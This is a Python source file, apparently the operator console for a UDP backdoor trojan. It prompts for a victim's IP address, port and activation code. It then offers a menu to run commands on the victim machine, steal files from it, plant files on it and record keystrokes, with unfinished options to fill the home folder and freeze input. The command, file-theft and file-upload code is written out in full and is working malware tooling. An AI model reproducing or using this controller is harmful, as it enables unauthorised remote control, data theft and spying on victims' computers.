#-----------------------------------------------------------------------------
# Name:        backdoor trojan connector.py
#
# Purpose:     This module is used to connect to the backdoor trojan to implement
#              the malware acction. The malware action currently provided are:
#               - Run a command on the victim machine.
#               - Run a command and check execution result on the victim machine.
#               - Steal a file from the victim machine.
#               - Insert a file to the victim machine.
#               - Record the user's keyboard input.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1
# Created:     2023/09/21
# Copyright:   n.a
# License:     n.a
#-----------------------------------------------------------------------------

import os
import udpCom

BUF_SZ = 60000
STR_DECODE = 'utf-8'

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(__file__)
print("Current source code location : %s" % dirpath)

print("Start Trojan connector...")
print(" - Please input the victim's IP address:")
ipAddr = str(input())
print(" - Please input the UDP connection port: ")
udpPort = int(str(input()))
# init the UDP connector.
client = udpCom.udpClient((ipAddr, udpPort))
client.setBufferSize(bufferSize=BUF_SZ)

print(" - Please input the trojan active code: ")
activeCode = str(input())
resp = client.sendMsg(activeCode, resp=True)
if isinstance(resp, bytes): resp = resp.decode(STR_DECODE)
if resp == 'ready':
    print("The backdoor trojan is ready for execute cmd.")
else:
    print("Trojan active code incorrect")
    exit()

while True:
    print(" - Please select trojan function: ")
    print(" - 0. Run a command on victim machine. ")
    print(" - 1. Run a command and check execution result on the victim machine.")
    print(" - 2. Steal a file from the victim machine.")
    print(" - 3. Insert a file into the victim machine.")
    print(" - 4. Start to record user's keyboard input.")
    print(" - 5. [Todo] Full fill user's home folder.")
    print(" - 6. [Todo] Freeze user mouse and keyboard.")

    msg = str(input())
    # Execute cmd 
    if msg == '1' or '0':
        print(" -- Type in the cmd you want to execute: ")
        cmd = str(input())
        request = 'CMD;detail;'+cmd if msg == '1' else 'CMD;run;'+cmd
        resp = client.sendMsg(request, resp=True)
        if isinstance(resp, bytes):resp = resp.decode('utf-8')
        print(" -- Cmd execution result: \n%s" % str(resp))
    # Steal file
    elif msg == '2':
        print(" -- Type the victim file path you want to steal: ")
        filepath = str(input())
        cmd = 'FIO;out;'+filepath
        resp = client.sendMsg(cmd, resp=True)
        if isinstance(resp, bytes): resp = resp.decode('utf-8')
        fileBytes = bytes.fromhex(resp)
        try:
            localFilePath = os.path.join(dirpath, os.path.basename(filepath))
            print("Save the stolen file to: %s" % str(localFilePath))
            with open(localFilePath, 'wb') as fh:
                fh.write(fileBytes)
        except Exception as err:
            print("*** Error: save file error: %s" % str(err))
    # Insert malware
    elif msg == '3':
        print(" -- Type the local file path you want to transfer to victim: ")
        filepath = str(input())
        if not os.path.exists(filepath):
            print("*** The local file is not exists.")
            continue
        filename = os.path.basename(filepath)
        try:
            fileData = b'error'
            with open(filepath, 'rb') as fh:
                fileData = fh.read()
            dataStr = fileData.hex()
            cmd = 'FIO;'+filename+';'+dataStr
            resp = client.sendMsg(cmd, resp=True)
            if isinstance(resp, bytes): resp = resp.decode('utf-8')
            if resp == 'done':
                print('File transfer success.')
            else:
                print('File transfer error.')
        except Exception as err:
            print("File open error: %s" % str(err))
     